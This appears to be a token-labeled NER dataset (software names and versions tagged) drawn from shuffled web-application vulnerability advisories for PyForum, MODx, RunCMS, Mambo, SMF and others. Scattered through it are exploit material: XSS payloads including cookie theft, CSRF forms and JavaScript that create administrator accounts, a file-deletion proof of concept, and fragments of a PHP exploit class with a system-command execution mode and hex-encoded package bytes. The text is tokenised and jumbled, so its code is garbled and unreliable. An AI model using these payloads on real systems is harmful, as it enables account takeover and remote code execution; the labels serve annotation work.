XSS O
vulnerability O
lies O
in O
the O
BBcode O
parsing O
in O
module O
`` O
models.parser O
`` O
. O

Fix O
There O
is O
no O
fix O
at O
the O
moment O
. O

BLUE O
MOON O
SECURITY O
ADVISORY O
2009-08 O
: O
Title O
: O
Multiple O
Vulnerabilities O
in O
PyForum O
: O
Severity O
: O
Critical O
: O
Reporter O
: O
Hoang O
Quoc O
Thinh O
and O
Blue O
Moon O
Consulting O
: O
Products O
: O
PyForum SN
v1.0.3 SV
: O
Fixed O
in O
: O
Description O
PyForum O
is O
a O
100 O
% O
python-based O
message O
board O
system O
based O
in O
the O
excellent O
web2py O
framework O
. O

CSRF O
vulnerability O
lies O
in O
the O
design O
of O
this O
web O
application O
. O

We O
have O
discovered O
cross O
site O
scripting O
and O
cross O
site O
request O
forgery O
vulnerabilities O
in O
PyForum O
. O

Disclaimer O
The O
information O
provided O
in O
this O
advisory O
is O
provided O
as O
is O
without O
warranty O
of O
any O
kind O
. O

[ O
BMSA-2009-08 O
] O
Multiple O
Vulnerabilities O
in O
PyForum O

Multiple O
cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerabilities O
in O
FreePBX SN
2.5.1 SV
, O
and SV
other SV
2.4.x SV
, O
2.5.x SV
, O
and SV
pre-release SV
2.6.x SV
versions O
, O
allow O
remote O
attackers O
to O
hijack O
the O
authentication O
of O
admins O
for O
requests O
that O
create O
a O
new O
admin O
account O
or O
have O
unspecified O
other O
impact O
. O

Unspecified O
vulnerability O
in O
Drupal SN
5.x SV
before SV
5.17 SV
and SV
6.x SV
before SV
6.11 SV
, O
as O
used O
in O
vbDrupal SN
before SV
5.17.0 SV
, O
allows O
user-assisted O
remote O
attackers O
to O
obtain O
sensitive O
information O
by O
tricking O
victims O
into O
visiting O
the O
front O
page O
of O
the O
site O
with O
a O
crafted O
URL O
and O
causing O
form O
data O
to O
be O
sent O
to O
an O
attacker-controlled O
site O
, O
possibly O
related O
to O
multiple O
( O
slash O
) O
characters O
that O
are O
not O
properly O
handled O
by O
includes/bootstrap.inc O
, O
as O
demonstrated O
using O
the O
search O
box O
. O

Cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerability O
in O
Bugzilla SN
before SV
3.2 SV
before SV
3.2.1 SV
, O
3.3 SV
before SV
3.3.2 SV
, O
and SV
other SV
versions SV
before SV
3.2 SV
allows O
remote O
attackers O
to O
perform O
bug O
updating O
activities O
as O
other O
users O
via O
a O
link O
or O
IMG O
tag O
to O
process_bug.cgi O
. O

Cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerability O
in O
page O
34 O
in O
MODx SN
CMS SN
0.9.6.1 SV
and SV
0.9.6.1p1 SV
allows O
remote O
attackers O
to O
hijack O
the O
authentication O
of O
other O
users O
for O
requests O
that O
modify O
passwords O
via O
manager/index.php O
. O

Digital O
Security O
Research O
Group O
[ O
DSecRG O
] O
Advisory O
DSECRG-08-013 O
Application O
: O
MODx O
CMS O
Versions O

Linked O
SiXSS O
3 O
. O

Multiple O
linked O
SiXSS O
vulnerabilities O
found O
. O

Linked O
XSS O
2 O
. O

Example O
: O
name O
= O
style= O
background O
: O
url O
( O
javascript O
: O
alert O
( O
DSecRG O
XSS O
) O
) O
4 O
. O

Attacker O
can O
comprose O
message O
with O
script O
code O
in O
subject O
and O
message O
body O
. O

GET O
parameter O
id O
Example O
: O
src= O
javascript O
: O
alert O
( O
DSecRG O
XSS O
) O
3 O
. O

Digital O
Security O
Research O
Group O
focuses O
on O
web O
application O
and O
database O
security O
problems O
with O
vulnerability O
reports O
, O
advisories O
and O
whitepapers O
posted O
regularly O
on O
our O
website O
. O

Contact O
: O
research O
[ O
at O
] O
dsec O
[ O
dot O
] O
ru O
( O
in O
Russian O
) O

Change O
User O
Password O
XSRF O
Vulnerability O
Details O
1 O
. O

2.1 O
Vulnerability O
found O
in O
script O
manager/index.php O
. O

GET O
parameter O
highlight O
Example O
: O
SRC= O
javascript O
: O
alert O
( O
DSecRG O
XSS O
) O
2 O
. O

Exploits O
: O
YES O
Reported O
: O
11.01.2008 SV

Attacker O
can O
inject O
XSS O
in O
URL O
string O
. O

Attacker O
can O
inject O
XSS O
code O
in O
SQL O
Error O
. O

1.1 O
Linked O
XSS O
vulnerability O
found O
in O
manager/index.php O
. O

POST O
parameters O
email O
, O
name O
and O
parent O
. O

Multiple O
linked O
XSS O
vulnerabilities O
found O
. O

Affected O
: O
0.9.6.1 SV
, O
0.9.6.1p1 SV

XSS O
in O
POST O
4 O
. O

POST O
parameters O
docgrp O
and O
moreResultsPage O
. O

[ O
DSECRG-08-013 O
] O
Modx SN
0.9.6.1 SV
, O
0.9.6.1p1 SV
Multiple O
Security O
Vulnerabilities O

Cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerability O
in O
RunCMS SN
1.6.1 SV
allows O
remote O
attackers O
to O
hijack O
the O
authentication O
of O
administrators O
for O
requests O
that O
( O
1 O
) O
add O
new O
administrators O
or O
( O
2 O
) O
modify O
user O
profiles O
via O
a O
crafted O
request O
to O
system/admin.php O
. O

RunCMS SN
1.6.1 SV
Multiple O
XSS O
and O
XSRF O
Vulnerabilties O
by O
NBBN O
[ O
b O
] O
1 O
) O
Create O
Webmaster O
( O
admin O
) O
XSRF O
Vulnerability O
[ O
/b O
] O
< O
html O
> O
< O
head O
> O
< O
/head O
> O
< O
body O
onLoad= O
javascript O
: O
document.attack.submit O
( O
) O
< O
form O
action= O
method= O
post O
enctype= O
multipart/form-data O
name= O
r O
< O
input O
type= O
hidden O
name= O
uname O
value= O
Attacker O
< O
input O
type= O
hidden O
name= O
name O
value= O
Attacker O
< O
input O
type= O
hidden O
name= O
email O
value= O
attack O
( O
at O
) O
attack O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
< O
input O
type= O
hidden O
name= O
url O
value= O
< O
input O
type= O
hidden O
name= O
user_avatar O
value= O
blank.gif O
< O
input O
type= O
hidden O
name= O
theme O
value= O
helloween O
< O
input O
type= O
hidden O
name= O
timezone_offset O
value= O
0 O
< O
input O
type= O
hidden O
name= O
language O
value= O
deutsch O
< O
input O
type= O
hidden O
name= O
user_icq O
value= O
< O
input O
type= O
hidden O
name= O
user_aim O
value= O
< O
input O
type= O
hidden O
name= O
user_msnm O
value= O
< O
input O
type= O
hidden O
name= O
user_from O
value= O
< O
input O
type= O
hidden O
name= O
user_occ O
value= O
< O
input O
type= O
hidden O
name= O
user_intrest O
value= O
< O
input O
type= O
hidden O
name= O
user_birth O
% O
5b2 O
% O
5D O
value= O
< O
input O
type= O
hidden O
name= O
user_birth O
% O
5B1 O
% O
5D O
value= O
< O
input O
type= O
hidden O
name= O
user_birth O
% O
5BO O
% O

RunCMS SN
1.6.1 SV
Multiple O
XSS O
and O
XSRF O
Vulnerabilties O

Cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerability O
in O
administrator/index2.php O
in O
MOStlyCE SN
before SV
2.4 SV
, O
as O
used O
in O
Mambo SN
4.6.3 SV
and SV
earlier SV
, O
allows O
remote O
attackers O
to O
hijack O
the O
authentication O
of O
administrators O
for O
requests O
that O
add O
new O
administrator O
accounts O
via O
the O
save O
task O
in O
a O
com_users O
action O
, O
as O
demonstrated O
using O
a O
separate O
XSS O
vulnerability O
in O
mambots/editors/mostlyce/jscripts/tiny_mce/filemanager/connectors/php/connector.php O
. O

You O
can O
create O
this O
structure O
manually O
or O
extract O
the O
UserFiles.zip O
file O
included O
with O
MOStlyCE O
at O
that O
location O
. O

POC O
: O
filemanager/connectors/php/connector.php O
Command=FileUpload O
& O
file=a O
& O
file O
[ O
NewFile O
] O
[ O
name O
] O
=abc.gif O
& O
file O
[ O
NewFile O
] O
[ O
tmp_name O
] O
=C O
: O
/path/to/MamboV4.6.2/co O
nfiguration.php O
& O
file O
[ O
NewFile O
] O
[ O
size O
] O
=1 O
& O
CurrentFolder= O
- O
Credit O
: O
AmnPardaz O
Security O
Research O
Team O
Contact O
: O
admin O
[ O
4t O
} O
bugreport O
{ O
d0t O
] O
ir O
WwW.BugReport.ir O
WwW.AmnPardaz.com O

Vulnerable O
Version O
: O
4.6.3 SV
( O
prior SV
versions SV
also O
may O
be O
affected O
) O
Exploitation O
: O
Remote O
with O
browser O
Fix O
Available O
: O
No O
! O

For O
this O
installation O
your O
document O
root O
is O
[ O
something O
] O
. O

Code O
Snippet O
: O
/mambots/editors/mostlyce/jscripts/tiny_mce/filemanager/connectors/php/C O
ommands/FileUpload.php O
45-60 O
function O
run O
( O
) O
{ O
If O
using O
CGI O
Upload O
script O
, O
get O
file O
info O
and O
insert O
into O
$ O
_FILE O
array O
if O
( O
( O
sizeof O
( O
$ O
_FILES O
) O
0 O
) O
& O
& O
isset O
( O
$ O
_GET O
[ O
file O
isset O
( O
$ O
_GET O
[ O
file O
] O
[ O
NewFile O
is_array O
( O
$ O
_GET O
[ O
file O
] O
[ O
NewFile O
if O
( O
isset O
( O
$ O
_GET O
[ O
file O
] O
[ O
NewFile O
] O
[ O
name O
GET O
[ O
file O
] O
[ O
NewFile O
] O
[ O
ize O
GET O
[ O
file O
] O
[ O
NewFile O
] O
[ O
tmp_name O
FILES O
[ O
NewFile O
] O
[ O
name O
] O
=basename O
( O
str_replace O
GET O
[ O
file O
NewFile O
] O
[ O
name O
FILES O
[ O
NewFile O
] O
[ O
ize O
] O
= O
$ O
_GET O
[ O
file O
] O
[ O
NewFile O
] O
[ O
ize O
FILES O
[ O
NewFile O
] O
[ O
tmp_name O
] O
= O
$ O
_GET O
[ O
file O
] O
[ O
NewFile O
] O
[ O
tmp_name O
else O
{ O
$ O
disp= O
202 O
, O
Incomplete O
file O
information O
from O
upload O
CGI O

/ O
$ O
filename. O
$ O
ext O
) O
,0777 O
) O
; O
$ O
disp= O
0 O
; O
} O
else O
{ O
$ O
disp= O
202 O
, O
Failed O
to O
upload O
file O
, O
internal O
error O
else O
{ O
if O
( O
rename O
( O
$ O
_FILES O
[ O
NewFile O
] O
[ O
tmp_name O
] O
, O
( O
$ O
this- O
> O
real_cwd O
. O

/ O
$ O
filename. O
$ O
ext O
) O
,0777 O
) O
; O
$ O
disp= O
0 O
; O
} O
else O
{ O
$ O
disp= O
202 O
, O
Failed O
to O
upload O
file O
, O
internal O
error O

- O
Vulnerability O
: O
+ O
Path O
Disclosure O
POC O
: O
filemanager/connectors/php/connector.php O
Command=RenameFile O
+ O
XSS O
POC O
: O
filemanager/connectors/php/connector.php O
Command= O
< O
script O
> O
alert O
( O
document O
. O

If O
an O
administrator O
follows O
up O
the O
above O
instruction O
, O
its O
possible O
for O
a O
remote O
attacker O
to O
remove O
any O
file O
from O
the O
remote O
server O
for O
example O
the O
main O
configuration O
file O
, O
which O
could O
result O
in O
remote O
denial O
of O
service O
! O

WwW.BugReport.ir O
AmnPardaz O
Security O
Research O
Team O
Title O
: O
Mambo O
Vulnerabilities O

Vendor O
: O
Bugs O
: O
Path O
Disclosure O
, O
XSS O
, O
XSRF O
, O
DOS O

The O
impact O
of O
the O
vulnerability O
increases O
when O
the O
administrator O
doesnt O
remove O
installation O
folder O
( O
its O
common O
to O
rename O
it O
to O
something O
predictable O
such O
as O
_installation O
) O
, O
in O
such O
a O
condition O
its O
possible O
for O
a O
remote O
attacker O
to O
delete O
configuration.php O
and O
install O
a O
new O
version O
of O
mambo O
on O
the O
victim O
server O
using O
remote O
database O
! O

163-178 O
Upload O
file O
if O
( O
is_uploaded_file O
( O
$ O
_FILES O
[ O
NewFile O
] O
[ O
tmp_name O
if O
( O
move_uploaded_file O
( O
$ O
_FILES O
[ O
NewFile O
] O
[ O
tmp_name O
] O
, O
( O
$ O
this- O
> O
real_cwd O
. O

/ O
$ O
filename. O
$ O
ext O
chmod O
( O
( O
$ O
this- O
> O
real_cwd O
. O

Not O
your O
Mambo O
root O
, O
your O
document O
root O
! O

cookie O
) O
< O
/script O
+ O
XSRF O
( O
the O
exploit O
creates O
an O
admin O
account O
) O
POC O
: O
mce/filemanager/connectors/php/connector.php O
Command= O
< O
script O
type=text/javascript O
src= O
content O
of O
Set O
desiered O
user O
, O
pass O
, O
email O
and O
victims O
url O
then O
upload O
the O
script O
somewhere O
on O
the O
web O
window.onload O
= O
function O
( O
) O
{ O
var O
url O
= O
var O
gid O
= O
25 O
; O
var O
user O
= O
amnpardaz O
; O
var O
pass O
= O
amnpardaz O
; O
var O
email O
= O
amnpardaz O
( O
at O
) O
none O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
; O
var O
param O
= O
{ O
name O
: O
user O
, O
username O
: O
user O
, O
email O
: O
email O
, O
password O
: O
pass O
, O
password2 O
: O
pass O
, O
gid O
: O
gid O
, O
block O
: O
0 O
, O
option O
: O
com_users O
, O
task O
: O
ave O
, O
sendEmail O
: O
0 O
} O
; O
var O
form O
= O
document.createElement O
( O
form O
) O
; O
form.action O
= O
url O
; O
form.method O
= O
post O
; O
form.target O
= O
hidden O
; O
form.style.display O
= O
none O
; O
for O
( O
var O
i O
in O
param O
) O
{ O
try O
{ O
ie O
var O
input O
= O
document.createElement O
( O
< O
input O
name= O
+i O
catch O
( O
e O
) O
{ O
other O
browsers O
var O
input O
= O
document.createElement O
( O
input O
) O
; O
input.name O
= O
i O
; O
} O
input.setAttribute O
( O
value O
, O
param O
[ O

/ O
$ O
f O
ilename. O
$ O
ext O
chmod O
( O
( O
$ O
this- O
> O
real_cwd O
. O

You O
can O
find O
the O
UserFiles.zip O
file O
at O
/mambots/editors/mostlyce O
. O

Description O
: O
Mambo O
is O
an O
, O
open O
source O
, O
modular O
, O
web O
content O
management O
system O
( O
CMS O
) O
, O
written O
in O
Php O
with O
a O
MySql O
database O
in O
backend O
. O

Mambo SN
4.6.3 SV
Path O
Disclosure O
, O
XSS O
, O
XSRF O
, O
DOS O

Cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerability O
in O
Cybozu SN
Office SN
6 SV
, O
Cybozu SN
Dezie SN
before SV
6.0 SV
( O
1.0 SV
) O
, O
and O
Cybozu SN
Garoon SN
2.0.0 SV
through SV
2.1.3 SV
allows O
remote O
attackers O
to O
hijack O
the O
authentication O
of O
unspecified O
victims O
via O
unknown O
vectors O
. O

Cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerability O
in O
index.php O
in O
Simple SN
Machines SN
Forum SN
( O
SMF SN
) O
1.0 SV
before SV
1.0.15 SV
and SV
1.1 SV
before SV
1.1.7 SV
allows O
remote O
attackers O
to O
hijack O
the O
authentication O
of O
admins O
for O
requests O
that O
install O
packages O
via O
the O
package O
parameter O
in O
an O
install2 O
action O
. O

SMF O
suffers O
from O
multiples O
vulnerabilities O
. O

secs O
( O
flood O
control O
) O
) O
; O
sleep O
( O
$ O
this- O
> O
wait O
) O
; O
Obtain O
session O
vars O
$ O
this- O
> O
url- O
> O
action O
= O
post O
; O
$ O
this- O
> O
url- O
> O
board O
= O
$ O
this- O
> O
bid O
. O

HTTP/1.1 O
; O
$ O
packet O
.= O
Host O
: O
. O

; O
if O
( O
! O
empty O
( O
$ O
this- O
> O
header O
) O
) O
$ O
this- O
> O
packet O
.= O
$ O
this- O
> O
showheader O
( O
) O
; O
if O
( O
! O
empty O
( O
$ O
this- O
> O
cookie O
) O
) O
$ O
this- O
> O
packet O
.= O
Cookie O
: O
. O
$ O
this- O
> O
showcookie O
( O
) O
. O

x2d O
xff O
xbd O
x41 O
x3e O
x98 O
x21 O
x1f O
xdc O
x23 O
x9f O
x39 O
x5b O
x08 O
. O

substr O
( O
$ O
data O
, O
( O
$ O
offset+2 O
return O
$ O
data O
Copyright O
( O
C O
) O
darkfig O
This O
program O
is O
free O
software O
; O
you O
can O
redistribute O
it O
and/or O
modify O
it O
under O
the O
terms O
of O
the O
GNU O
General O
Public O
License O
as O
published O
by O
the O
Free O
Software O
Foundation O
; O
either O
version O
2 O
of O
the O
License O
, O
or O
( O
at O
your O
option O
) O
any O
later O
version O
. O

@ O
access O
private O
@ O
param O
string O
code O
ServerResponse O
function O
getcookie O
( O
) O
{ O
foreach O
( O
explode O
( O
, O
$ O
this- O
> O
getheader O
( O
) O
) O
as O
$ O
header O
) O
{ O
if O
( O
preg_match O
( O
/set-cookie/i O
, O
$ O
header O
) O
) O
{ O
$ O
fequal O
= O
strpos O
( O
$ O
header O
fvirgu O
= O
strpos O
( O
$ O
header O
12=strlen O
( O
et-cookie O
: O
) O
$ O
cname O
= O
substr O
( O
$ O
header,12 O
, O
$ O
fequal-12 O
) O
; O
$ O
cvalu O
= O
substr O
( O
$ O
header O
, O
$ O
fequal+1 O
, O
$ O
fvirgu- O
( O
strlen O
( O
$ O
cname O
) O
+12+1 O
) O
) O
; O
$ O
this- O
> O
cookie O
[ O
trim O
( O
$ O
cname O
) O
] O
= O
trim O
( O
$ O
cvalu O
This O
function O
is O
called O
by O
the O
get O
( O
) O
/post O
( O
) O
functions O
. O

x71 O
x83 O
x7a O
x88 O
x02 O
xad O
x6a O
x28 O
xa2 O
x48 O
x4c O
xb4 O
x0d O
x9a O
. O

So O
here O
come O
the O
wait-I O
ve-not-finished O
part O
. O

basic O
display O
for O
mysql O
results O
$ O
this- O
> O
ssql O
.= O
$ O
s=str_repeat O
50 O
) O
. O

But O
SMF O
urldecode O
( O
) O
GET O
data O
, O
so O
I O
replaced O
action O
by O
% O
61ction O
. O

x5e O
xdf O
xd7 O
xcf O
x2b O
xe3 O
x52 O
x91 O
x28 O
xaa O
xde O
xc5 O
x51 O
xe1 O
. O

xe3 O
x28 O
xd4 O
xbc O
xa8 O
x47 O
x8d O
xe8 O
xbd O
x66 O
xcd O
x86 O
x8f O
xb4 O
. O

x87 O
x5e O
xc2 O
x00 O
x33 O
xd3 O
xa7 O
x30 O
x96 O
x34 O
xd4 O
x41 O
x35 O
xc9 O
. O

@ O
access O
public O
@ O
return O
string O
$ O
this- O
> O
header_str O
Headers O
@ O
example O
$ O
this- O
> O
showheader O
function O
showheader O
( O
) O
{ O
$ O
this- O
> O
header_str O
if O
( O
! O
isset O
( O
$ O
this- O
> O
header O
) O
) O
return O
; O
foreach O
( O
$ O
this- O
> O
header O
as O
$ O
name O
= O
$ O
value O
) O
$ O
this- O
> O
header_str O
.= O
$ O
name O
. O

See O
the O
GNU O
General O
Public O
License O
for O
more O
details O
. O

@ O
access O
public O
@ O
return O
string O
$ O
this- O
> O
packet O
HttpPacket O
@ O
example O
$ O
this- O
> O
showlastrequest O
function O
showlastrequest O
( O
) O
{ O
if O
( O
! O
isset O
( O
$ O
this- O
> O
packet O
) O
) O
return O
; O
else O
return O
$ O
this- O
> O
packet O
This O
function O
sends O
the O
formed O
http O
packet O
with O
the O
GET O
method O
. O

It O
can O
return O
the O
content O
( O
or O
the O
headers O
) O
of O
the O
request O
. O

xf6 O
x6c O
xf2 O
x66 O
x20 O
x93 O
xc3 O
x12 O
xf6 O
xf0 O
xe1 O
xfd O
x04 O
x65 O
. O

I O
writed O
click O
, O
so O
many O
of O
you O
may O
say O
brr O
, O
that O
sucks O
. O

xb5 O
x60 O
x88 O
xd2 O
x6f O
x11 O
xe5 O
x94 O
x86 O
x52 O
x73 O
xc4 O
x5a O
x1c O
. O

$ O
sql- O
> O
var_db O
. O

x01 O
xcb O
x86 O
xa5 O
xc6 O
x29 O
x8b O
x26 O
x7e O
x8b O
x34 O
x4b O
x8c O
x31 O
. O

x9d O
x71 O
xbc O
xc7 O
x99 O
x2f O
x78 O
x19 O
x5b O
xb2 O
x9d O
x16 O
x8a O
x14 O
. O

index.php O
Log O
in O
... O
function O
login O
( O
) O
{ O
$ O
user O
= O
explode O
this- O
> O
user O
) O
; O
$ O
this- O
> O
url O
= O
action=login2 O
; O
$ O
this- O
> O
data O
= O
user= O
. O
$ O
user O
. O

xd5 O
x33 O
x4d O
xc4 O
xf1 O
xad O
xed O
x52 O
x97 O
x2a O
x85 O
xb5 O
x29 O
x75 O
. O

] O
; O
switch O
( O
$ O
this- O
> O
mode O
) O
{ O
case O
cmd O
: O
$ O
this- O
> O
data O
= O
ystem O
( O
< O
CMD O
break O
; O
case O
php O
: O
$ O
this- O
> O
data O
break O
; O
case O
ql O
: O
$ O
this- O
> O
data O
= O
$ O
this- O
> O
ssql O
; O
break O
; O
} O
return O
$ O
this- O
> O
mode O
exec O
( O
) O
Execute O
any O
query O
and O
catch O
the O
result O
. O

xab O
xb6 O
x9c O
xff O
xff O
xc6 O
xfc O
x9f O
x2f O
x90 O
x05 O
xe6 O
xff O
xbc O
. O

xac O
x03 O
xb1 O
x08 O
xd9 O
x90 O
x0d O
x88 O
xc2 O
x73 O
xe8 O
x5e O
x74 O
x83 O
. O

) O
1234567890 O
, O
cmd O
, O
$ O
sql O
) O
; O
} O
function O
wwwinit O
( O
) O
{ O
$ O
this- O
> O
www O
= O
new O
phpsploit O
( O
) O
; O
$ O
this- O
> O
www- O
> O
cookiejar O
( O
1 O
) O
; O
$ O
this- O
> O
www- O
> O
addheader O
( O
Referer O
, O
$ O
this- O
> O
furl O
. O

url O
= O
substr O
( O
$ O
url O
, O
0 O
, O
-1 O
) O
; O
} O
else O
$ O
url O
= O
$ O
this- O
> O
url O
; O
$ O
url O
= O
$ O
this- O
> O
furl O
. O

x50 O
xa4 O
xd0 O
x3d O
xfe O
x00 O
x09 O
x19 O
xdc O
x90 O
x6b O
x34 O
x70 O
x75 O
. O

; O
$ O
this- O
> O
packet O
.= O
Content-Length O
: O
.strlen O
( O
$ O
this- O
> O
data O
) O
. O

x53 O
x31 O
x06 O
x92 O
x52 O
x50 O
xe9 O
x94 O
xf1 O
x6b O
x50 O
x02 O
x58 O
xd6 O
. O

Other O
little O
problems O
have O
been O
corrected O
. O

TITLE O
: O
PhpSploit O
Class O
REQUIREMENTS O
: O
PHP O
4 O
PHP O
5 O
VERSION O
: O
2.0 O
LICENSE O
: O
GNU O
General O
Public O
License O
ORIGINAL O
URL O
: O
FILENAME O
: O
phpsploitclass.php O
CONTACT O
: O
gmdarkfig O
@ O
gmail.com O
( O
french O
english O
) O
GREETZ O
: O
Sparah O
, O
Ddx39 O
DESCRIPTION O
: O
The O
phpsploit O
is O
a O
class O
implementing O
a O
web O
user O
agent O
. O

& O
cookielength=-1 O
; O
$ O
this- O
> O
post O
( O
) O
; O
$ O
this- O
> O
location- O
> O
action O
= O
login2 O
; O
$ O
this- O
> O
location- O
> O
sa O
= O
check O
; O
if O
( O
$ O
this- O
> O
location O
( O
) O
) O
$ O
this- O
> O
msg O
( O
Logged O
in O
as O
. O

this- O
> O
ssql O
.= O
print O
$ O
s O
; O
; O
$ O
this- O
> O
ssql O
.= O
if O
( O
$ O
q O
) O
; O
$ O
this- O
> O
ssql O
this- O
> O
ssql O
.= O
while O
( O
$ O
r=mysql_fetch_array O
( O
$ O
q O
, O
MYSQL_ASSOC O
this- O
> O
ssql O
this- O
> O
ssql O
.= O
foreach O
( O
$ O
r O
as O
$ O
k= O
> O
$ O
v O
) O
print O
. O
$ O
k.str_repeat O
20-strlen O
( O
$ O
k O
) O
) O
. O

xd9 O
xc8 O
x2c O
x76 O
x8c O
xc3 O
x5c O
x01 O
x56 O
xb4 O
x9c O
xc6 O
xf1 O
x6a O
. O

x2b O
xe9 O
xb9 O
xbc O
xcf O
x42 O
x20 O
x74 O
x1c O
x75 O
x85 O
x48 O
x12 O
x63 O
. O

x0b O
x39 O
x34 O
xe3 O
xac O
xfd O
x7d O
xbb O
xea O
x78 O
xd6 O
xfd O
xc2 O
x64 O
. O

) O
; O
$ O
this- O
> O
msg O
( O
) O
; O
$ O
this- O
> O
msg O
( O
Post O
URL O
: O
. O

xc0 O
x67 O
x4c O
x36 O
xe3 O
x0a O
x9c O
x5a O
xbd O
xb1 O
xe5 O
x36 O
xdf O
xbe O
. O

this- O
> O
ssql O
.= O
$ O
q=mysql_query O
( O
< O
CMD O
) O
or O
print O
( O
$ O
s.mysql_error O
( O
) O
. O

We O
modify O
our O
post O
, O
adding O
an O
[ O
img O
] O
( O
1 O
) O
[ O
/img O
] O
, O
replacing O
[ O
filename O
] O
by O
../attachments/ O
[ O
the_name_you_just_found O
] O
4 O
. O

@ O
access O
public O
@ O
param O
string O
useragent O
Agent O
@ O
example O
$ O
this- O
> O
agent O
( O
Firefox O
function O
agent O
( O
$ O
useragent O
) O
{ O
$ O
this- O
> O
addheader O
( O
User-Agent O
, O
$ O
useragent O
This O
function O
returns O
the O
headers O
which O
will O
be O
in O
the O
next O
request O
. O

md5 O
( O
jpeg.jpg O
) O
; O
$ O
this- O
> O
url- O
> O
package O
attachments O
. O

x7f O
x70 O
xdd O
x7a O
x36 O
xff O
x1d O
xd7 O
x75 O
xec O
x06 O
xce O
x7f O
x67 O
. O

HTTP/1.1 O
; O
elseif O
( O
$ O
this- O
> O
method O
post O
or O
$ O
this- O
> O
method O
formdata O
) O
$ O
this- O
> O
packet O
= O
POST O
. O
$ O
this- O
> O
url O
. O

$ O
expr O
this- O
> O
location O
= O
( O
array O
) O
$ O
this- O
> O
location O
; O
foreach O
( O
$ O
this- O
> O
location O
as O
$ O
key O
= O
$ O
value O
) O
{ O
$ O
expr O
.= O
$ O
key O
. O

The O
second O
part O
is O
more O
interesting O
now O
, O
no O

; O
return O
$ O
this- O
> O
sock O
This O
function O
returns O
the O
content O
of O
the O
server O
response O
, O
without O
the O
headers O
. O

@ O
access O
public O
@ O
param O
string O
code O
ServerResponse O
@ O
return O
string O
$ O
this- O
> O
server_content O
@ O
example O
$ O
this- O
> O
getcontent O
( O
) O
@ O
example O
$ O
this- O
> O
getcontent O
( O
$ O
this- O
> O
url O
function O
getcontent O
( O
$ O
code O
if O
( O
empty O
( O
$ O
code O
) O
) O
$ O
code O
= O
$ O
this- O
> O
recv O
; O
$ O
code O
= O
explode O
( O
, O
$ O
code O
) O
; O
$ O
this- O
> O
server_content O
for O
( O
$ O
i=1 O
; O
$ O
i O
< O
count O
( O
$ O
code O
) O
; O
$ O
i++ O
) O
$ O
this- O
> O
server_content O
.= O
$ O
code O
[ O
$ O
i O
] O
; O
return O
$ O
this- O
> O
server_content O
This O
function O
returns O
the O
headers O
of O
the O
server O
response O
, O
without O
the O
content O
. O

$ O
user O
) O
; O
else O
$ O
this- O
> O
msg O
( O
Can O
t O
log O
in O
, O
1 O
Get O
seqnum O
and O
sescode O
function O
get_sessionvars O
( O
) O
{ O
$ O
this- O
> O
get O
( O
) O
; O
$ O
this- O
> O
scode O
= O
$ O
this- O
> O
match O
( O
name= O
sc O
value= O
( O
[ O
0-9a-f O
1 O
) O
; O
$ O
this- O
> O
sqnum O
= O
$ O
this- O
> O
match O
( O
name= O
seqnum O
value= O
( O
[ O
0-9 O
1 O
Submit O
our O
post O
, O
containing O
our O
gzipped O
package O
function O
submit_post O
Flood O
control O
: O
let O
sleep O
a O
little O
$ O
this- O
> O
msg O
( O
Waiting O
. O

) O
; O
; O
elseif O
( O
isset O
( O
$ O
sql- O
> O
db O
) O
) O
$ O
this- O
> O
ssql O
.= O
mysql_select_db O

i O
; O
$ O
head O
= O
$ O
this- O
> O
www- O
> O
getheader O
( O
) O
; O
return O
preg_match O
( O
$ O
expr O
, O
$ O
head O
) O
; O
} O
function O
match O
( O
$ O
expr O
, O
$ O
one O
= O
0 O
) O
{ O
SMF O
likes O
making O
a O
mess O
with O
URL O
, O
so O
... O
let O
consider O
all O
cases O
. O

= O
. O
$ O
value O
. O

x98 O
x99 O
xff O
x39 O
x3d O
xbf O
x8d O
xa8 O
x39 O
x35 O
x8b O
x22 O
xaa O
x86 O
. O

-url O
[ O
url O
] O
-bid O
[ O
bid O
] O
-user O
[ O
user O
] O
: O
[ O
passwd O
this- O
> O
msg O
( O
OR O
php O
. O

xe4 O
xa0 O
x87 O
xdc O
x6c O
xef O
x9a O
xde O
x21 O
x92 O
x65 O
xff O
xfb O
xde O
. O

x5d O
x71 O
x52 O
xdd O
x37 O
x12 O
x37 O
x17 O
xc7 O
xa3 O
x69 O
xb9 O
xbb O
xf7 O
. O

x99 O
xf0 O
x6e O
x82 O
x99 O
xa4 O
x22 O
xa1 O
x69 O
x34 O
x35 O
xc9 O
x84 O
x67 O
. O

@ O
access O
public O
@ O
param O
string O
code O
ServerResponse O
@ O
return O
string O
$ O
this- O
> O
server_header O
@ O
example O
$ O
this- O
> O
getcontent O
( O
) O
@ O
example O
$ O
this- O
> O
getcontent O
( O
$ O
this- O
> O
post O
function O
getheader O
( O
$ O
code O
if O
( O
empty O
( O
$ O
code O
) O
) O
$ O
code O
= O
$ O
this- O
> O
recv O
; O
$ O
code O
= O
explode O
( O
, O
$ O
code O
) O
; O
$ O
this- O
> O
server_header O
= O
$ O
code O
; O
return O
$ O
this- O
> O
server_header O
This O
function O
is O
called O
by O
the O
cookiejar O
( O
) O
function O
. O

Others O
useful O
functions O
can O
be O
used O
for O
debugging O
. O

@ O
access O
private O
@ O
return O
string O
$ O
this- O
> O
url O
return O
string O
$ O
this- O
> O
url O
( O
$ O
this- O
> O
last_redirection O
) O
@ O
return O
string O
$ O
this- O
> O
recv O
; O
function O
getredirection O
( O
) O
{ O
if O
( O
preg_match O
( O
/ O
( O
location|content-location|uri O
) O
: O
( O
. O

HTTP/1.1 O
; O
else O
die O
( O
Error O
: O
Invalid O
method O
) O
; O
if O
( O
! O
empty O
( O
$ O
this- O
> O
proxyuser O
) O
) O
$ O
this- O
> O
packet O
.= O
Proxy-Authorization O
: O
Basic O
.base64_encode O
( O
$ O
this- O
> O
proxyuser O
. O

$ O
expr O
. O

xce O
x31 O
x94 O
x46 O
x4a O
x25 O
x2d O
xcb O
x9a O
x4c O
x26 O
x55 O
xc9 O
xe2 O
. O

But O
the O
session O
code O
is O
not O
required O
for O
SMF O
package O
installation O
. O

x9c O
xaa O
x5d O
xda O
xf1 O
x57 O
x57 O
xbc O
xb5 O
xfd O
xd3 O
